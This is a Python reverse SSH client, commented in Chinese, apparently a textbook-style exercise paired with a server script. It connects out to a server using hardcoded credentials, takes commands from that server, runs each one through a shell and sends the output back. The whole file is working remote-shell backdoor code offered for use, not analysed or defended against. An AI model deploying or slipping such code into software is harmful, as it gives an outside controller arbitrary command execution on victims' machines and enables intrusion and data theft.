#!/usr/bin/env python3
#-*- coding: utf-8 -*-

#ssh 反向客户端与sshserver.py一起使用
#负责执行服务器上传来的命令并返回

import paramiko
import subprocess

def ssh_command(ip, port, user, passwd, command):
    client = paramiko.SSHClient()
    #client.load_host_keys('path')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, port=port, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()

    if ssh_session.active:
        #先发送一个连接命令给服务器，command=ClientConnected
        ssh_session.send(command)
        #读取sshserver.py返回的banner
        print(ssh_session.recv(1024))
        
        #进入循环，执行服务器上传来的命令
        while True:
            #从服务器上获取命令
            command = ssh_session.recv(1024)

            if command.decode('utf-8') == 'exit':
                ssh_session.send('Goodbey!!!')
                break

            try:
                cmd_output = subprocess.run(command.decode('utf-8'), shell=True,
                        check=True, stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT).stdout
                ssh_session.send(cmd_output)
            except Exception as e:
                ssh_session.send(e)
        client.close()
    return
ssh_command('127.0.0.1', 9090, 'justin', 'lovethepython', 'ClientConnected')
